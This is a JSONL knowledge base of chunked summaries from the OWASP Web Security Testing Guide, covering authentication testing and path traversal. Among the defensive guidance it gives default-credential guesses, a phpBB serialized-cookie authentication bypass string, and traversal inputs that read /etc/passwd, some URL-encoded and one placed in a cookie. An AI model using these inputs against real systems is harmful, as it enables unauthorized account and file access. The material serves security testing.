{"id": "kb-000603", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing strategies involve using well-known default usernames such as 'admin', 'administrator', 'root', 'system', 'guest', 'super', or more generic ones like 'qa', 'test', and 'test1', in combination with potential passwords. Common passwords to try include 'password', 'pass123', 'admin', and even blank passwords, especially when testing known usernames."}
{"id": "kb-000604", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Clever approaches include trying application or organization names as usernames and passwords, like 'obscurity/obscurity' for an application named 'Obscurity'. Social engineering tactics include using names from customer contacts and common passwords to identify more usernames."}
{"id": "kb-000605", "section": null, "tags": ["AUTHN", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Reviewing source code and JavaScript for user references can provide clues, with particular attention to conditional statements or parameters. Inspecting comments in the source code or backup directories can reveal potential vulnerabilities, like hardcoded credentials."}
{"id": "kb-000606", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Default passwords for new accounts often lead to unauthorized access if users do not change them upon first time use, highlighting the importance of encouraging users to change default settings."}
{"id": "kb-000607", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Examining the user registration page helps ascertain formats for usernames and passwords, informing potential guesses for testing vulnerabilities."}
{"id": "kb-000608", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Fuzzing can be used to attempt to discover valid account names in applications that generate them in predictable sequences (e.g., user7811)."}
{"id": "kb-000609", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "If an application responds differently when a valid username is paired with an incorrect password, a brute force attack might be feasible on the valid username using common passwords. To check for predictable password generation, create multiple accounts in quick succession and analyze the passwords against the usernames. Common predictable sequences for passwords include dates of birth, which can be used in brute force attacks."}
{"id": "kb-000610", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "In Gray-Box Testing, having some internal information can enhance the testing process; engaging with IT personnel can provide insights into administrative password use and application management."}
{"id": "kb-000611", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "It is crucial to verify whether default passwords have been changed and if default user accounts are disabled to eliminate potential vulnerabilities. Checking the user database for default credentials and empty password fields is vital in identifying security gaps."}
{"id": "kb-000612", "section": null, "tags": ["AUTHN", "CONF"], "source": "wstg-v4.2.pdf", "text": "Gray-Box Testing also involves examining the application code for hardcoded usernames and passwords as well as configuration files that may contain sensitive information. Understanding the password policy of the application, especially for auto-generated passwords, is essential for assessing security."}
{"id": "kb-000613", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Account lockout mechanisms help mitigate brute force attacks by preventing unauthorized access after a certain number of failed login attempts."}
{"id": "kb-000614", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Common attacks that can be mitigated by lockout mechanisms include login password or username guessing attacks and code guessing on 2FA or security questions."}
{"id": "kb-000615", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Typically, accounts are locked after 3 to 5 unsuccessful login attempts, which can be unlocked through a self-service mechanism or administrator intervention."}
{"id": "kb-000616", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing the effectiveness of an account lockout mechanism involves deliberately attempting invalid logins to assess how the mechanism responds to failed authentication attempts."}
{"id": "kb-000617", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "A suggested test consists of multiple attempts to log in with incorrect passwords followed by a correct password to see if the account is locked out as expected, indicating the mechanism works as intended."}
{"id": "kb-000618", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "For example, if you try logging in incorrectly 5 times, the account should lock, and on the next login attempt with the correct password, it should indicate that the account is locked out."}
{"id": "kb-000619", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The test should check if the account automatically unlocks after a predetermined time, showing whether the lockout system is appropriately configured. CAPTCHA can help hinder brute force attacks but has its own vulnerabilities, and it should not replace lockout mechanisms."}
{"id": "kb-000620", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Common CAPTCHA flaws include: 1) Easily defeated challenges like simple arithmetic or limited question sets; 2) CAPTCHA checks relying solely on HTTP response codes; 3) Default successful settings in CAPTCHA server-side logic; 4) Absence of server-side validation of CAPTCHA results; 5) Improper processing and validation of CAPTCHA input fields."}
{"id": "kb-000621", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To evaluate CAPTCHA effectiveness, various tests should be conducted, including attempting to bypass CAPTCHA challenges, manipulating requests to submit without solving CAPTCHA, testing for common injection payloads, and more."}
{"id": "kb-000622", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "An unlock mechanism should use unique one-time links to prevent replay attacks and should only be used for unlocking accounts, not for password recovery."}
{"id": "kb-000623", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Different types of account unlock mechanisms have varying levels of assurance, ranging from a time-based lockout to manual administrator unlocks combined with positive user identification."}
{"id": "kb-000624", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "When implementing an account lockout mechanism, consider the risk of brute force password guessing against the application, and evaluate if a CAPTCHA is sufficient to mitigate this risk."}
{"id": "kb-000625", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Assess whether a client-side lockout mechanism, such as JavaScript, is being utilized, and determine if it should be disabled for testing purposes."}
{"id": "kb-000626", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Determine the appropriate number of unsuccessful login attempts allowed before account lockout, with a typical range being 5 to 10 attempts. A low threshold may inconvenience valid users, while a high threshold could allow attackers more attempts to brute force accounts."}
{"id": "kb-000627", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Establish how accounts will be unlocked after a lockout: manual unlocking by an administrator is secure but may be inconvenient and time-consuming, and may lead to a denial-of-service scenario if an attacker targets user accounts."}
{"id": "kb-000628", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Consider lockout duration—ranging from 5 to 30 minutes might be a reasonable compromise to mitigate brute force attacks while minimizing user inconvenience. Implement a secure self-service mechanism for unlocking accounts to ensure that attackers cannot exploit it to unlock accounts easily."}
{"id": "kb-000629", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Authentication is the process of verifying the digital identity of a sender in computer security, commonly exemplified by the log on process."}
{"id": "kb-000630", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing the authentication schema involves understanding its workings to effectively circumvent it when necessary, highlighting potential security flaws."}
{"id": "kb-000631", "section": null, "tags": ["API", "AUTHN"], "source": "wstg-v4.2.pdf", "text": "Not all authentication methods provide adequate security; negligence or ignorance in design can lead to bypass vulnerabilities where users may access restricted areas directly without logging in."}
{"id": "kb-000632", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Common methods to bypass authentication include tampering with requests, altering URL parameters, manipulating forms, or counterfeiting sessions."}
{"id": "kb-000633", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Problems with the authentication schema can emerge at different stages of the Software Development Life Cycle (SDLC): design, development, and deployment phases."}
{"id": "kb-000634", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "Errors in the design phase may include improperly defining protected application sections or failing to use strong encryption for credential transmission."}
{"id": "kb-000635", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "In the development phase, mistakes can involve incorrect input validation or not adhering to security best practices relevant to the programming language used. Deployment phase issues often arise from incorrect application setup, stemming from inadequate technical skills or poor documentation. Key test objective: Ensure authentication is consistently applied across all services that require it."}
{"id": "kb-000636", "section": null, "tags": ["AUTHN", "SESSION", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Black-box testing encompasses methods such as forced browsing, parameter modification, session ID prediction, and SQL injection to test authentication schema vulnerabilities."}
{"id": "kb-000637", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Parameter modification is a security issue in web applications that can lead to unauthorized access when authentication relies on fixed value parameters."}
{"id": "kb-000638", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "In the discussed example, the 'authenticated' parameter is manipulated from 'no' to 'yes' in a URL to gain access to protected content without valid credentials."}
{"id": "kb-000639", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "This type of attack can occur through various means, including direct URL manipulation or using proxy tools to alter parameters in POST requests, or even cookies."}
{"id": "kb-000640", "section": null, "tags": ["AUTHN", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "The example provided demonstrates an HTTP request modification that changes the authentication state, illustrating how easy it can be for an attacker to bypass authentication if the application does not implement proper security checks. Session ID prediction poses a security risk in web applications where session identifiers (session IDs) are used for authentication."}
{"id": "kb-000641", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "If session ID generation is predictable, attackers can gain unauthorized access by guessing valid session IDs, allowing them to impersonate authenticated users."}
{"id": "kb-000642", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "An example of a risky session ID generation method is when cookie values increase linearly, making it easy for attackers to guess valid session IDs."}
{"id": "kb-000643", "section": null, "tags": ["API", "SESSION"], "source": "wstg-v4.2.pdf", "text": "An additional example describes cookie values that change only partially, which can allow attackers to restrict their brute-force attacks to specific fields of the session ID."}
{"id": "kb-000644", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL Injection is a widely known attack technique that allows attackers to execute arbitrary SQL code on a database by manipulating input fields in web applications."}
{"id": "kb-000645", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The section notes that SQL Injection methods will be further explored in other sections of the guide, indicating the importance and complexity of the topic in web security."}
{"id": "kb-000646", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The figure referenced indicates that SQL injection can be used to bypass authentication mechanisms, which is a significant security concern for web applications."}
{"id": "kb-000647", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Gray-Box Testing: This type of testing refers to scenarios where the attacker has access to the application source code, allowing for refined attacks based on the implementation details of the authentication process."}
{"id": "kb-000648", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Vulnerability Example: The text details a specific vulnerability found in PHPBB 2.0.13 where an attacker can bypass authentication controls by exploiting the unserialize() function on user-supplied cookies."}
{"id": "kb-000649", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Code Snippet Analysis: The code snippet demonstrates how the unserialize function can be manipulated. By injecting a specific serialized string (\"a:2:{s:11:\\\"autologinid\\\";b:1;s:6:\\\"userid\\\";s:1:\\\"2\\\";}\") containing the boolean true value to the unserialize function, an attacker can bypass the authentication process because the comparison checks will always return true between certain values in PHP."}
{"id": "kb-000650", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Programming Logic: It explains a PHP behavior where the comparison of a string (from unserialization) and a boolean value results in a true statement, allowing the attacker to manipulate authentication status."}
{"id": "kb-000651", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Tool References: It mentions tools like WebGoat and OWASP Zed Attack Proxy (ZAP) which can be employed for security testing and to explore vulnerabilities. Credentials are a common authentication technology, but users often struggle to manage them across multiple applications. Technologies like 'remember me' functionality and password managers have emerged to help users handle their credentials more easily. Test objectives include validating that session management is secure to protect user credentials."}
{"id": "kb-000652", "section": null, "tags": ["AUTHN", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Testing methods for vulnerabilities include checking if credentials are improperly stored in the client-side application instead of being securely managed server-side."}
{"id": "kb-000653", "section": null, "tags": ["AUTHN", "CSRF"], "source": "wstg-v4.2.pdf", "text": "Potential vulnerabilities include storing credentials in encoding that can be accessed via web storage mechanisms, making them susceptible to ClickJacking and CSRF attacks."}
{"id": "kb-000654", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Token management is crucial; tokens with long lifetimes can pose security risks if stolen. Testing should include session timeout to ensure tokens expire as necessary."}
{"id": "kb-000655", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Remediation strategies involve following best practices for session management and ensuring sensitive information is stored securely and not exposed in clear text or easily retrievable formats in browser storage."}
{"id": "kb-000656", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for browser cache weaknesses (ID: WSTG-ATHN-06) focuses on ensuring applications do not retain sensitive data that could be accessed through browser caching and history mechanisms."}
{"id": "kb-000657", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Browsers can store sensitive information, like addresses and credit card details, for performance optimization (caching) and user convenience (history)."}
{"id": "kb-000658", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Sensitive information may be retrievable by examining the browser's cache or by using the Back button if it is not properly handled by the application."}
{"id": "kb-000659", "section": null, "tags": ["AUTHZ", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Test objectives include reviewing if the application stores sensitive information on the client-side and if this information can be accessed without authorization."}
{"id": "kb-000660", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The simplest method to test for history weaknesses is to log out of the application after entering sensitive information and then pressing the Back button to see if sensitive data is accessible."}
{"id": "kb-000661", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "If previously displayed sensitive information is accessible via the Back button, it indicates a problem with how the application handles sensitive data, rather than an authentication failure."}
{"id": "kb-000662", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Sensitive data can be protected from being displayed via the Back button by delivering pages over HTTPS and setting HTTP response headers like Cache-Control: must-revalidate."}
{"id": "kb-000663", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "For browser cache testing, a proxy tool (e.g., OWASP ZAP) can be employed to verify that pages containing sensitive information do not allow caching, by checking for specific HTTP response header directives: Cache-Control: no-cache, no-store and Expires: 0. Cache-Control directives are used to prevent caching of sensitive information by instructing browsers on how to handle stored data. Robust HTTP directives include: 'Cache-Control: must-revalidate', 'max-age=0', and 's-maxage=0'. Examples of cache locations vary by browser: - Mozilla Firefox: Unix/Linux at ~/.cache/mozilla/firefox/ and Windows at C:\\Users\\<user_name>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile-id>\\Cache2\\ - Internet Explorer: C:\\Users\\<user_name>\\AppData\\Local\\Microsoft\\Windows\\INetCache\\ - Chrome: Windows at C:\\Users\\<user_name>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache and Unix/Linux at ~/.cache/google-chrome."}
{"id": "kb-000664", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testers should ensure that e-commerce applications do not cache pages containing sensitive financial information like credit card numbers, to avoid sensitive data being stored on disk. Firefox provides functionality to view cached information through developer tools and using the URL 'about:cache'."}
{"id": "kb-000665", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Mobile browsers may handle caching directives differently than desktop browsers, necessitating the need for testers to start sessions with clean caches and utilize developer tools to conduct tests."}
{"id": "kb-000666", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Gray-box testing provides testers with access to server response headers and HTML code, allowing for a mix of black-box functionality with additional knowledge."}
{"id": "kb-000667", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The prevalence of static passwords as an authentication mechanism can lead to security vulnerabilities due to user behavior prioritizing usability over security. Common weak passwords include '123456', 'password', and 'qwerty'."}
{"id": "kb-000668", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The test objectives for assessing password policies focus on evaluating password strength against brute force attacks using password dictionaries, considering aspects like length, complexity, reuse, and aging."}
{"id": "kb-000669", "section": null, "tags": ["API", "AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Testing should address several questions: 1) Permitted and forbidden characters in a password, including requirements for character set diversity (lowercase, uppercase, digits, special symbols); 2) The frequency at which users can change their passwords and possible bypass tactics; 3) Requirements for forced password changes; 4) Rules for password reuse and history maintenance; 5) Differences required between consecutive passwords; 6) Restrictions against using usernames or personal information in passwords; 7) Minimum and maximum password lengths related to account sensitivity; 8) The potential for users to select common passwords, like 'Password1' or '123456'."}
{"id": "kb-000670", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Recommendations to mitigate risks include implementing additional authentication controls such as two-factor authentication and establishing a strong password policy that enforces length, complexity, reuse, and aging requirements. Ideally, both solutions should be implemented for better security. Security questions, often referred to as 'secret' questions, are used for password recovery and added security but are often insecure. Security questions ideally should have answers known only to the user, making them non-guessable and non-discoverable. Many pre-generated security questions are simplistic, allowing for answers that can be guessed or discovered by others."}
{"id": "kb-000671", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Examples of insecure pre-generated questions include:\n- \"What is your mother's maiden name?\" (known to family)\n- \"What is your favorite color?\" (easily guessable)\n- \"What is the first name of your favorite high school teacher?\" (brute forcible)\n- \"What is your favorite movie?\" (publicly discoverable)"}
{"id": "kb-000672", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Self-generated security questions are often insecure, allowing users to create questions like:\n- \"What is 1+1?\"\n- \"What is your username?\"\n- \"My password is S3cur|ty!\""}
{"id": "kb-000673", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Test objectives for assessing security questions include evaluating their complexity and the likelihood of user answers being susceptible to brute force attacks."}
{"id": "kb-000674", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "To test for weak pre-generated questions, one can create a new account or initiate a password recovery process to gather security question samples. Any questions that fall into insecure categories can be exploited."}
{"id": "kb-000675", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing for Weak Self-Generated Questions involves assessing how easily users can create weak security questions during account setup or password recovery."}
{"id": "kb-000676", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "If a system allows users to create their own security questions, it is likely vulnerable, especially when exploiting forgotten password functionality and if user enumeration is possible."}
{"id": "kb-000677", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Brute-forcible answers can be tested by checking if multiple incorrect answers trigger a lockout mechanism, which can lead to potential vulnerabilities."}
{"id": "kb-000678", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Most applications require the answer to only one security question, making them easier to exploit. Some critical applications may require answers to two or more questions. The strength of security questions can often be compromised by information available through social engineering or simple online searches."}
{"id": "kb-000679", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "When evaluating security questions, testers should prioritize questions with public answers, factual answers, and those with limited possible responses."}
{"id": "kb-000680", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding the number of guesses allowed, lockout mechanisms, and the potential for Denial of Service attacks is crucial when assessing security question schemes."}
{"id": "kb-000681", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To exploit a weak security question, focus on questions that provide the highest chances of finding correct answers based on social media, online presence, or personal information. The overall strength of a security question scheme is determined by its weakest question."}
{"id": "kb-000682", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The password change and reset function is a self-service mechanism allowing users to update their passwords without administrative intervention. Security concerns arise from how passwords are stored, potentially in plain text or a decryptable format."}
{"id": "kb-000683", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Testing objectives involve assessing the application's resistance to unauthorized password changes and the ability of users to guess or bypass password reset mechanisms."}
{"id": "kb-000684", "section": null, "tags": ["AUTHN", "CSRF"], "source": "wstg-v4.2.pdf", "text": "Important tests include determining if users can change/reset passwords for accounts other than their own and testing for vulnerabilities to Cross-Site Request Forgery (CSRF). The security of password reset functionality can depend significantly on the information required to reset a password."}
{"id": "kb-000685", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "If an application sends a password reset link or password without verifying secret questions, it might be entirely dependent on the security of the user's email. The strength of security questions should be evaluated as they could be a weak point if poorly chosen or easily guessable."}
{"id": "kb-000686", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The communication method used during a password reset can vary in security levels; the least secure method displays the password directly, while more secure methods include forcing a password change or sending a reset link to the registered email address."}
{"id": "kb-000687", "section": null, "tags": ["AUTHN", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The most insecure application scenario is sending or visualizing old passwords in clear text, indicating passwords are not stored securely (not hashed)."}
{"id": "kb-000688", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Best practices for password generation include using a secure algorithm to randomly generate passwords that cannot be derived, enhancing security."}
{"id": "kb-000689", "section": null, "tags": ["AUTHN", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "To limit denial-of-service attacks, the application should send an email containing a link with a random token for password reset confirmation, ensuring current passwords remain valid until the reset is confirmed."}
{"id": "kb-000690", "section": null, "tags": ["AUTHN", "SESSION"], "source": "wstg-v4.2.pdf", "text": "For a secure password change process, the application should require the old password for verification; allowing changes without this confirmation is a security risk as it can enable an attacker to change a victim's password if they control a valid session."}
{"id": "kb-000691", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Remediation measures suggest that password change or reset functionalities must include protective measures like requiring user re-authentication or providing confirmation screens to ensure security."}
{"id": "kb-000692", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Even if the primary authentication mechanisms do not include any vulnerabilities, there may be vulnerabilities in alternative legitimate authentication user channels. Testing should identify alternative channels and potential vulnerabilities as part of security assessments. Alternative user interaction channels can be used to circumvent primary authentication channels or expose sensitive information. Examples of alternative user interaction channels include: - Mobile, or specific device optimized websites - Accessibility optimized websites - Alternative country and language websites - Parallel websites utilizing the same user accounts - Development, test, UAT, and staging versions of standard websites"}
{"id": "kb-000693", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Other types of applications and business processes that may serve as alternative channels include mobile apps, desktop applications, call center operators, and interactive voice response systems. The focus of testing should be on alternative channels that could impact the security of the primary channel. Documentation of alternative channels is crucial, even if they cannot be tested, to understand potential risks and vulnerabilities."}
{"id": "kb-000694", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Example situation: A main website uses secure TLS for authentication, but an associated mobile website lacks this security, potentially exposing users to risk. **Test Objectives**: Identify alternative authentication channels and assess their security measures for potential bypasses."}
{"id": "kb-000695", "section": null, "tags": ["AUTHN", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "**Primary Mechanism Testing**: Fully test the primary authentication functions to understand account issuance, password recovery, and privilege elevation. This knowledge is essential for comparing alternative channels."}
{"id": "kb-000696", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "**Identifying Other Channels**: Methods to find alternative authentication channels include:\n- Reviewing site content, such as privacy notices and help pages.\n- Analyzing HTTP proxy logs for specific keywords related to mobile and authentication.\n- Searching for different organizational sites sharing similar content or domain names."}
{"id": "kb-000697", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "**Authentication Functionality Enumeration**: Create comparative grids to evaluate authentication functions across channels. For example, assess if the primary and alternative channels allow functions such as registration, login, logout, and password resets."}
{"id": "kb-000698", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "**Call Center Risks**: Call centers may have weaker identity confirmation processes, potentially aiding unauthorized access to user accounts."}
{"id": "kb-000699", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "**Reporting Findings**: Alternative channels identified during testing should be included in testing reports, with notes on scope and permissions for further testing if applicable. Test cases for authentication should be consistent and utilized across all channels to ensure comprehensive security. A consistent authentication policy is crucial for securing various channels effectively."}
{"id": "kb-000700", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Web applications frequently manage files and require strong input validation methods to prevent exploitation by attackers who may read or write unauthorized files."}
{"id": "kb-000701", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "Directory traversal vulnerabilities can allow an attacker to execute arbitrary code or system commands, compromising the application's security."}
{"id": "kb-000702", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Authentication mechanisms are implemented in web servers and applications to manage access to files and resources, typically using a defined root directory."}
{"id": "kb-000703", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Access Control Lists (ACLs) are used to specify file access privileges for users or groups, aiming to prevent unauthorized access to sensitive files like '/etc/passwd' on UNIX-like systems."}
{"id": "kb-000704", "section": null, "tags": ["HTTP", "PATH", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Path traversal/file include attacks occur when input parameters (such as form parameters or cookie values) are improperly validated, allowing attackers to read unauthorized directories or files. Common names for path traversal attacks include dot-dot-slash attack (../), directory traversal, directory climbing, or backtracking."}
{"id": "kb-000705", "section": null, "tags": ["HTTP", "PATH"], "source": "wstg-v4.2.pdf", "text": "To uncover path traversal and file include flaws, security testers typically utilize a two-stage approach: Input Vectors Enumeration and Testing Techniques."}
{"id": "kb-000706", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "The objective during testing is to identify injection points linked to path traversal and assess bypassing techniques to determine the depth of traversal issues."}
{"id": "kb-000707", "section": null, "tags": ["HTTP", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "The tester should enumerate all parts of the application that accept user input, including HTTP GET and POST queries, file uploads, and HTML forms, to identify potential vulnerabilities to input validation bypassing."}
{"id": "kb-000708", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Examples of checks during this enumeration include examining request parameters for file-related operations, unusual file extensions, and interesting variable names."}
{"id": "kb-000709", "section": null, "tags": ["AUTHN", "CRYPTO", "HTTP", "PATH"], "source": "wstg-v4.2.pdf", "text": "The document presents a testing technique where dynamic pages, like getUserProfile.jsp, could be attacked if the input validation fails; an attacker could attempt to access sensitive files, such as the Linux/UNIX password hash file located at /etc/passwd, through input like ../../../../etc/passwd."}
{"id": "kb-000710", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Knowledge of the file system and server configuration is critical; for example, requesting /etc/passwd from an IIS web server would not be effective because that file does not exist on Windows servers."}
{"id": "kb-000711", "section": null, "tags": ["PATH", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Cookies can also be manipulated for testing; inserting malicious strings into cookie values, such as Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd, could lead to vulnerabilities if the application does not properly validate these inputs."}
{"id": "kb-000712", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Files and scripts located on external websites can also be included using input parameters that accept URLs, which expands the attack surface."}
{"id": "kb-000713", "section": null, "tags": ["CONF", "PATH"], "source": "wstg-v4.2.pdf", "text": "Probing local filesystems and services can occur if the web application accepts protocols as arguments, potentially exposing sensitive local configurations or services. Explanation of how CGI source code can be accessed without path traversal characters using a specific URL structure. Caution noted regarding developers' common mistakes in validating encoded content, particularly not accounting for all encoding schemes. Different path separators for various operating systems: Unix-like (/) and Windows (\nor /), Classic macOS (:)."}
{"id": "kb-000714", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "Character encoding mechanisms outlined, including URL encoding and double URL encoding examples, demonstrating how to represent directory traversal attempts through encoding. Specific examples of encoding representing directory traversal are provided, such as %2e%2e%2f for '../' and ..%c0%af for '../' in UTF-8."}
{"id": "kb-000715", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Windows operating system's flexibility in parsing file paths is highlighted, with notes on command-line behavior when using certain types of additional characters or markers. The Windows API discards certain characters when processing filenames in shell commands or API calls, specifically periods and spaces."}
{"id": "kb-000716", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Windows UNC filepaths are used for referencing files on SMB shares. Applications may refer to remote UNC filepaths, potentially exposing stored credentials to attackers through SMB servers. Examples of UNC filepaths include: \\\\server_or_ip\\path\\to\\file.abc and \\\\?\\server_or_ip\\path\\to\\file.abc."}
{"id": "kb-000717", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Windows NT Device Namespace allows access to the file systems with different path references, such as drive letters (c:\\) and device volumes (e.g., \\\\.\\GLOBALROOT\\Device\\HarddiskVolume1\\)."}
{"id": "kb-000718", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Gray-box testing allows testers to analyze the application source code while still following the methodology of black-box testing, enhancing the identification of vulnerabilities."}
{"id": "kb-000719", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "Testers can employ simple tools like grep to search for patterns in source code related to file system operations, including functions such as include(), require(), fopen(), and readfile() for PHP or java.io.File() for JSP/Servlet. By using online code search engines like Searchcode, testers can identify path traversal flaws in open-source projects."}
{"id": "kb-000720", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "In gray-box testing, vulnerabilities related to dynamic pages generated using database-stored parameters can be harder to detect, such as through path traversal strings that seem internal but are unsafe."}
{"id": "kb-000721", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Reviewing source code can help identify security flaws in functions that improperly handle invalid input, where developers may attempt to validate or transform invalid inputs to suppress warnings."}
{"id": "kb-000722", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "The page focuses on testing for directory traversal vulnerabilities in web security, particularly through manipulating the 'filename' variable in a web application context."}
